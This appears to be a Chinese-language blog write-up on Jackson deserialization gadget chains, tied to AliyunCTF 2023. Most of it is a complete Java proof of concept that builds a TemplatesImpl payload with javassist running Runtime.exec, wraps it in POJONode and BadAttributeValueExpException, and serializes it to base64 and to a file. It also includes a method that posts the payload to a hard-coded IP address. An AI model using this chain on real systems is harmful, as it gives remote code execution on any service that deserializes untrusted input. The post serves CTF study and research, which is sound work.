JackSon反序列化利用链注意点首先需要注意的就是Jackson的toString链是有个坑点的，首先PoJoNode类是继承ValueNode，而ValueNode是继承BaseJsonNode类的，我们看看BaseJsonNode而它拥有writeReplace函数，有这个函数就意味着反序列化时不会走正常渠道，而是走他这个writeReplace方法，这是反序列化的规则，详细参考AliyunCTF 2023 WriteUP解决方法就是重写一个BaseNodeJson最后呢经过我一个小时的测试，一共分为三条链子，就是以下三条
TemplatesImpl链最为经典的一条链子，只需要把FastJson的JsonObject修改为PoJoNode即可：
package org.example;import com.fasterxml.jackson.databind.node.POJONode;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import javassist.ClassPool;import javassist.CtClass;import javassist.CtConstructor;import org.springframework.http.HttpEntity;import org.springframework.http.HttpHeaders;import org.springframework.http.ResponseEntity;import org.springframework.web.client.RestTemplate;import javax.management.BadAttributeValueExpException;import java.io.*;import java.lang.reflect.Field;import java.net.URI;import java.security.*;import java.util.Base64;public class TemplatesImplChain &#123;    public static void main(String[] args) throws Exception &#123;        ClassPool pool = ClassPool.getDefault();        CtClass ctClass = pool.makeClass(&quot;a&quot;);        CtClass superClass = pool.get(AbstractTranslet.class.getName());        ctClass.setSuperclass(superClass);        CtConstructor constructor = new CtConstructor(new CtClass[]&#123;&#125;,ctClass);        constructor.setBody(&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;);        ctClass.addConstructor(constructor);        byte[] bytes = ctClass.toBytecode();        TemplatesImpl templatesImpl = new TemplatesImpl();        setFieldValue(templatesImpl, &quot;_bytecodes&quot;, new byte[][]&#123;bytes&#125;);        setFieldValue(templatesImpl, &quot;_name&quot;, &quot;boogipop&quot;);        setFieldValue(templatesImpl, &quot;_tfactory&quot;, null);        POJONode jsonNodes = new POJONode(templatesImpl);        BadAttributeValueExpException exp = new BadAttributeValueExpException(null);        Field val = Class.forName(&quot;javax.management.BadAttributeValueExpException&quot;).getDeclaredField(&quot;val&quot;);        val.setAccessible(true);        val.set(exp,jsonNodes);        ByteArrayOutputStream barr = new ByteArrayOutputStream();        ObjectOutputStream objectOutputStream = new ObjectOutputStream(barr);        objectOutputStream.writeObject(exp);        FileOutputStream fout=new FileOutputStream(&quot;1.ser&quot;);        fout.write(barr.toByteArray());        fout.close();        FileInputStream fileInputStream = new FileInputStream(&quot;1.ser&quot;);        System.out.println(serial(exp));        deserial(serial(exp));    &#125;    public static void doPOST(byte[] obj) throws Exception&#123;        HttpHeaders requestHeaders = new HttpHeaders();        requestHeaders.set(&quot;Content-Type&quot;, &quot;text/plain&quot;);        URI url = new URI(&quot;http://112.124.14.13:8080/bypassit&quot;);        HttpEntity&lt;byte[]&gt; requestEntity = new HttpEntity &lt;&gt; (obj,requestHeaders);        RestTemplate restTemplate = new RestTemplate();        ResponseEntity&lt;String&gt; res = restTemplate.postForEntity(url, requestEntity, String.class);        System.out.println(res.getBody());    &#125;    public static String serial(Object o) throws IOException, NoSuchFieldException &#123;        ByteArrayOutputStream baos = new ByteArrayOutputStream();        ObjectOutputStream oos = new ObjectOutputStream(baos);        oos.writeObject(o);        oos.close();        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());        return base64String;    &#125;    public static void deserial(String data) throws Exception &#123;        byte[] base64decodedBytes = Base64.getDecoder().decode(data);        ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes);        ObjectInputStream ois = new ObjectInputStream(bais);        ois.readObject();        ois.close();    &#125;    private static void Base64Encode(ByteArrayOutputStream bs)&#123;        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());        String s = new String(encode);        System.out.println(s);        System.out.println(s.length());    &#125;    private static void setFieldValue(Object obj, String field, Object arg) throws Exception&#123;        Field f = obj.getClass().getDeclaredField(field);        f.setAccessible(true);        f.set(obj, arg);    &#125;&#125;
可以看到是成功的RCE了的，有一个小细节就是尽量把TemplatesImpl换为Templates，也就是它的父类，这样可以避免一些错误然后简单的跟一下调试流程吧。触发toString，进入到PoJoNode的toString方法实际上是BaseJsonNode的toString方法，最后就是获取到getter并且调用这里获取getter我也不是特别清楚，在aliyunctf的wp里我也跟踪了，就是不知道哪里获取的，和网上的有些差异。
